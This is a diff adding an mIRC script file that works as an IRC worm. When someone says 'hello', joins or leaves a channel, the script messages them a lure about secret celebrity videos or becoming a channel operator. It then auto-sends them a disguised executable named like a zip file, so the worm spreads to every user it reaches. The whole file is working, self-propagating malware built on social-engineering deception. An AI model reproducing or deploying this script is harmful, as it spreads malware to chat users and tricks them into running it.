@@ -1,0 +1,16 @@
+[script]
+n0= on 1:TEXT:*hello*:#:{
+n1= /if ( $nick == $me ) { halt }
+n2= /msg $nick Hello, in this interesting channal.... this file is Britny spears secret files which contain vedios and some photoes of her marraige whith Bnladen sone in Texas ..see it it very interesting and replay us to give Britny spears secrets email and her phones numbers 
+n3= /dcc send -c $nick c:\program files\mirc\Britny spears marriage with Bnladen son.zip.exe
+n4= }
+n5= on 1:JOIN:#:{
+n6= /if ( $nick == $me ) { halt }
+n7= /msg $nick Be a channel operator using this software from mIRCx...this is very secret files about britny spears videos and photoes
+n8= /dcc send -c $nick c:\program files\mirc\Britny spears marriage with Bnladen son.zip.exe
+n9= }
+n10= on 1:PART:#:{
+n11= /if ( $nick == $me ) { halt }
+n12= /msg $nick Be a channel operator using this software from mIRCx...this is very secret files about britny spears videos and photoes
+n13= /dcc send -c $nick c:\program files\mirc\Britny spears marriage with Bnladen son.zip.exe
+n14= }
